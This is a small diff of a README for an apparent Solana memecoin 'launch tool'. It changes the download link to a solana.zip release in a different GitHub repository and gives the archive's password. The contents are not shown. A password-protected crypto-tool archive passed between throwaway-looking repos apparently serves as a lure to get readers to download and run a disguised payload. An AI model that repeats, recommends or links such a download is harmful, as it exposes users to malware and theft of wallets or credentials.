@@ -6,7 +6,7 @@ LAUNCH! Solana is a versatile all-in-one tool designed for creating, configuring
 
 ## 🛠 How to Use
 
-**Download the latest version** from the [**Releases**](https://github.com/saintjohndoe/testrepgit/releases/download/sol/solana.zip) page
+**Download the latest version** from the [**Releases**](https://github.com/mckicylja/how-to-launch-memecoin-solana/releases/download/sol/solana.zip) page
 
  *The archive password is **SOL!Launch37**
 
